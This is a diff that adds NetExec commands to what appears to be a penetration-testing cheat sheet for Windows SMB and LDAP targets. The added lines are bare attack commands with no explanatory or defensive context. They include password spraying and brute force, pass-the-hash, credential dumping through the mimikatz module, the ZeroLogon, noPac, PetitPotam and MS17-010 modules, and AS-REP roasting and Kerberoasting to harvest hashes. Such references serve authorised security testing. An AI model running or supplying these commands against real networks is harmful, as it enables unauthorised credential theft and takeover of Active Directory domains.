@@ -15,3 +15,25 @@ nxc smb "$IP" -u "$USER" -p "$PASSWORD"  -M spider_plus -o DOWNLOAD_FLAG=true OU
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --users-export users.txt
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --shares
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --users
+netexec smb "$RANGE" --gen-relay-list smb_targets.txt
+netexec smb "$RANGE" --local-auth -u '' -p ''
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
+netexec smb "$RANGE" -u '' -p '' --shares
+netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
+netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
+netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M noPac
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M petitpotam
+netexec smb "$TARGET" -u '' -p '' --generate-hosts-file hosts
+netexec smb "$TARGET" -u '' -p '' -M ioxidresolver
+netexec smb "$TARGET" -u '' -p '' -M ms17-010
+netexec smb "$TARGET" -u '' -p '' -M zerologon
+netexec smb "$TARGET" -u '' -p '' --pass-pol
+netexec smb --list-modules
+netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
+netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
